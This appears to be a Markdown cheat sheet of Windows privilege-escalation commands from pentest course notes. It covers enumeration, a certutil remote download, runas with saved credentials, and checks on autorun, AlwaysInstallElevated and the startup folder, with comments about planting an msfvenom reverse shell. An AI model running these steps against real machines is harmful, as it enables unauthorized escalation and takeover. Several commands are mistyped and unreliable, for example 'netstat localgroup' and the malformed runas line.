# Information gathering
## info about the OS
```powershell
systeminfo
hostname
#To see the patches done to the os use Windows management instrumentation command
wmic qfe 
#To list the logical drives:
wmic logicaldisk
```
## User enumeration
```powershell
#To get privileges for the user
whoami /priv
#To get the groups for the user
whoami /groups
#To list all users on the machine
net user
#To get info about s single user
net user <USER>
#To list all members of a group
netstat localgroup <GROUP>
```
## Network enumeration
```powershell
#To network stats  
ipconfig /all  
arp -a  
netstat -ano
```
## AV enumeration
```powershell
#To see the status of the windows defender  
sc query windefend  
#To list all the services running on the box  
sc qureryex type = service  
#To see the stat of the firewall   
netsh firewall show state  
netsh advfirewall dump   
#Config of firewall  
netsh firewall show config 
```
## Download files using CMD
```powershell
certutil -urlcache -f http://<site> <FILE> <location to save to on remote mahine>
```

## Windows linux subsystem
```powershell
#Searching for necessary executables
where /R C:\windows bash.exe  
where /R C:\windows wsl.exe
```

## Alternative data streams
```powershell
dir /R  
more < <data stream> #To see the content
```
## Run As
```powershell
cmdkey /list  
C:\Windows\System32\runas.exe user:ACCESS\Administator savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop
```
## Auto Run
```powershell
#Some programms are running automatically on boot so we want to see if a program is auto runnning as admin to replace thar programme with one customized   
#using msfvenom to get a reverse shell
wmic startup get caption,command 2>nul
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
You can find them using powerup.ps1
```
## AlwaysInstallElevated
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Find using powerup.ps1 OR winPEAS
```
## Startup Apps
```powershell
#Have to do manually and looking for a 'F' full write read access to inject an msfvenome .exe to get a RevShell.
#icalcs is tool used to check permissions or delete or modify  
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

---
## Useful links
- [**More Resources for PrivESC**](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources)